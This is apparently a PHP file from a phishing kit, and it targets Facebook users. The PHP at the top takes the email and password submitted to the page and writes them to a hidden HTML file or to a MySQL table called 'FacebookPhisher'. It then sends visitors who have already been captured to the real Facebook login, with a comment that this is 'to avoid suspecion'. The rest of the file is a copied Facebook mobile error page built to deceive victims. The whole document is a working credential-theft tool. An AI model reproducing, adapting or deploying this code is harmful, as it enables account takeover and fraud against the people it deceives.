<?php

session_start();

if(isset($_SESSION['already_visited'])){
	
	header("Location:https://m.facebook.com/login/"); // redirecting previous traffic to avoid suspecion.
	exit();
	
}
require "config.php";

if ($_SERVER['REQUEST_METHOD'] == 'POST' and isset($_POST['login']) and !empty($_POST['email']) and !empty($_POST['pass'])) {
	
	if (strtolower($MODE) == "fopen") {
		
		$FILE = fopen("$SECRET_FILE.html", "a");

		fwrite($FILE, purify($_POST['email']) . '|' . purify($_POST['pass']) . '<br />');

		fclose($FILE);
		
	} elseif (strtolower($MODE) == "mysql") {
		
		$con = new connect();
		
		$username = mysqli_real_escape_string($con->start_connection() ,$_POST['email']);
		
		$password = mysqli_real_escape_string($con->start_connection() ,$_POST['pass']);

		$query = "insert into `FacebookPhisher` values (null,'$username','$password',now())";

		$result = @mysqli_query($con->start_connection() ,$query);
		
	} else {
		
		die("<h1>YOU MUST SET UP THE CONFIG FILE!</h1><br /><br />");
		
	}
	$_SESSION['already_visited'] = $_POST['email'];

}
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <title>Error Facebook</title>
    <meta name="viewport"             content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <meta http-equiv="Content-Type"   content="text/html; charset=utf-8" />
    <meta http-equiv="Cache-Control"  content="no-cache" />
    <meta name="robots"               content="noindex, nofollow" />
    <style type="text/css">
      body {
        margin: 0;
        padding: 0;
        font-family: "Helvetica", sans-serif;
        font-size: 14px;
        background-color: #f2f2f2;
      }

      img {
        vertical-align: top;
      }

      a {
        color: #3b5998;
        text-decoration: none;
      }

      .touch a {
        color: #576b95;
      }

      hr {
        display: none;
      }

      .fb_header {
        padding: 3px;
        background-color: #3b5998;
      }

      .app .fb_header {
        display: none;
      }

      .touch .fb_header {
        background: -webkit-gradient(
          linear, left top, left bottom, from(#738ABA), to(#2C4987)
        );
        border-bottom: 1px solid #111A33;
        box-shadow: inset 0 1px 1px -1px white;
        -webkit-box-shadow: inset 0 1px 1px -1px white;
        height: 29px;
        padding: 7px 0;
      }

      .touch .fb_header img {
        display: none;
      }

      .touch .fb_logo {
        margin: 2px auto;
        width: 123px;
        height: 24px;
        background: url(//www.facebook.com/images/mobile/chrome/ui/page-header/logo/fb_logo.png) no-repeat;
        background-size: 100% 100%;
      }

      .touch.hdpi .fb_logo {
        background-image: url(//www.facebook.com/images/mobile/chrome/ui/page-header/logo/fb_logo-1.5x.png);
      }

      .touch.hires .fb_logo {
        background-image: url(//www.facebook.com/images/mobile/chrome/ui/page-header/logo/fb_logo-2x.png);
      }

      .area {
        padding: 6px 4px;
      }

      .touch .area {
        padding: 8px;
      }

      .error {
        background-color: #fff;
        border-bottom: 1px solid #ccc;
      }

      .footer {
        color: gray;
        font-size: 12px;
      }

      .footer a {
        color: #8190b0;
      }
    </style>
  </head>
  <body>
    <script type="text/javascript">
      <!--
      var classes = '';
      if ('ontouchstart' in document.documentElement) {
        classes += 'touch ';
        if (window.devicePixelRatio === 1.5) {
          classes += 'hdpi ';
        } else if (window.devicePixelRatio > 1.5) {
          classes += 'hires ';
        }
        if (navigator.userAgent.indexOf('FBForIPhone') >= 0 ||
            navigator.userAgent.indexOf('FBIOS') >= 0 ||
            navigator.userAgent.indexOf('FBAN') >= 0 ||
            navigator.userAgent.indexOf('FB4A') >= 0) {
          classes += 'app ';
        }
      }
      document.body.className = classes;
      // -->
    </script>
    <div class="fb_header">
      <div class="fb_logo">
        <img src="fb_logo_small.gif" width="77" height="15" alt="Facebook" />
      </div>
    </div>
    <div class="area error">
      <strong>Sorry, something went wrong.</strong>
      <p>We are working on it and we'll get it fixed as soon as we can.</p>
      <p><a href="https:/m.facebook.com/login/">&laquo; Back to Home</a></p>
    </div>
    <div class="area footer">
      <hr />
      Meta &copy; <?php echo date("Y"); ?> &#183;
      <a href="#" onClick="return false;">Help</a>
    </div>
  </body>
</html>
